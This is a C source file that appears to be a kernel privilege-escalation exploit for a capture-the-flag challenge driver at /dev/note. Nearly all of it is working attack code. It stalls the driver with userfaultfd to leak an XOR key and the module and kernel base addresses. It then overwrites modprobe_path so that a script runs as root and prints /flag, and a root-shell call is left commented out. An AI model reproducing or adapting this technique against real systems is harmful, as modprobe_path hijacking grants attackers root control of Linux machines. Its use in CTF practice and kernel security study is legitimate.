#define USERFAULT_CONTROL 0
#include "helpful.h"

int g_fd = 0;
extern size_t g_vmlinux_base_addr;
long g_modprobe_path = 0;
unsigned long base_addr = 0;
long key = 0;
struct request{
    size_t idx;
    size_t len;
    char *buf;
};

void add(int idx,int len,char * buf){
    struct request rq;
    rq.len = len;
    rq.buf = buf;
    assert(ioctl(g_fd,-256,&rq) >= 0);
}
void del(){
    struct request rq;
    assert(ioctl(g_fd,-253,&rq) >= 0);
}
void show(int idx,char *buf){
    struct request rq;
    rq.idx = idx;
    rq.buf = buf;
    assert(ioctl(g_fd,-254,&rq) >= 0);
}
void edit(int idx,char * buf){
    struct request rq;
    rq.idx = idx;
    rq.buf = buf;
    assert(ioctl(g_fd,-255,&rq) >= 0);
}
void leak_helper(char *page,char *buf){
    char a[0x1000];
    del();
    add(0,0x0,buf);
    add(1,0x0,buf);
    a[8] = 0xf0;
    memcpy(page,a,0x10);
}
void leak(){
    char buf[0x1000] = {0};
    char *page;
    unsigned long module_base = 0;
    int page_base_offset = 0;
    
    unsigned long readl_module_base = 0;
    int copy_offset = 0;
    page = get_mmap_rw(0,0x1000);
    add(0,0x10,buf);
    register_userfault(page,&userfaultfd_stuck_handler,&leak_helper,buf);
    edit(0,page);
    show(1,buf);
    key = *(long *)buf;
    printf("[+] key = 0x%llx\n",key);
    add(2,0x0,buf);
    show(1,buf);
    module_base = (*((long *)buf+2) ^ key) - 0x2568;
    printf("[+] module_base = 0x%llx\n",module_base);
    long *tmp = (long *)buf;
    tmp[0] = 0 ^ key;
    tmp[1] = 4 ^ key;
    tmp[2] = (module_base + 0x1fa) ^ key;
    edit(1,buf);
    show(2,&page_base_offset);
    printf("[+] page_base_offset = 0x%x\n",page_base_offset);
    unsigned long page_base = (module_base + 0x1fe + page_base_offset );
    printf("[+] page_base = 0x%llx\n",page_base);
    tmp[0] = 0 ^ key;
    tmp[1] = 8 ^ key;
    tmp[2] = page_base ^ key;
    edit(1,buf);
    show(2,&base_addr);
    printf("[+] base_addr = 0x%llx\n",base_addr);
    readl_module_base = module_base + base_addr;
    printf("[+] readl_module_base = 0x%llx\n",readl_module_base);
    tmp[0] = 0 ^ key;
    tmp[1] = 8 ^ key;
    tmp[2] = (module_base + 0x213 + 0x1) ^ key;
    edit(1,buf);
    show(2,&copy_offset);
    g_vmlinux_base_addr = readl_module_base + copy_offset + 0x213 + 0x5 - (0xae553e80-0xae200000); 
    printf("[+] kernel_base = 0x%llx\n",g_vmlinux_base_addr);
    g_modprobe_path = g_vmlinux_base_addr + (0xb1c5e0e0 - 0xb0c00000);
    printf("[+] modprobe_path = 0x%llx\n",g_modprobe_path);
}
void attack(){
    long buf[0x100] = {0};
    buf[0] = 0 ^ key;
    buf[1] = 0x20 ^ key;
    buf[2] = (g_modprobe_path - base_addr) ^ key;
    edit(1,buf);
    edit(2,"1.sh");
    system("mkdir /tmp");
    prepare_for_modprobe_path("/1.sh");
    system("cd /tmp");
    system("./dummy");
    system("cat /flag");
}
void main(){
    save_status();
    g_fd = open("/dev/note",0);
    assert(g_fd > 0);
    leak();
    attack();
    //get_root_shell();
}
